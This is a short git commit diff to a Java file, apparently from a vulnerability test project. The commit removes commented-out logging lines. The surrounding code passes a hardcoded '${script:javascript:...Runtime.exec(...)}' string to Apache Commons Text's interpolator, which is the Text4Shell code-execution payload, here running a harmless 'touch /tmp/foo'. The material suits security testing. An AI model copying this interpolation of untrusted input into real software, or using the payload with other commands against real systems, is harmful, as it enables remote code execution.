e7c0ef3a4fa5d20ce08f92c73957803685043219
Gabriel Vazquez <gabrielv@sonatype.com>
2024-08-26 17:33:33 -0300

    more test

--- src/main/java/MyApp.java
+++ src/main/java/MyApp.java
@@ -1,13 +1,11 @@
-// import java.util.logging.Logger;
 
 import org.apache.commons.text.StringSubstitutor;
 
 public class MyApp {
 
-    // static Logger logger = Logger.getLogger(MyApp.class.getName());
     public static void main(String[] args) {
         System.out.println("Hello, World!");
-        // logger.info("Hello, World!");
+
 
         final StringSubstitutor interpolator = StringSubstitutor.createInterpolator();
         String out = interpolator.replace("${script:javascript:java.lang.Runtime.getRuntime().exec('touch /tmp/foo')}");
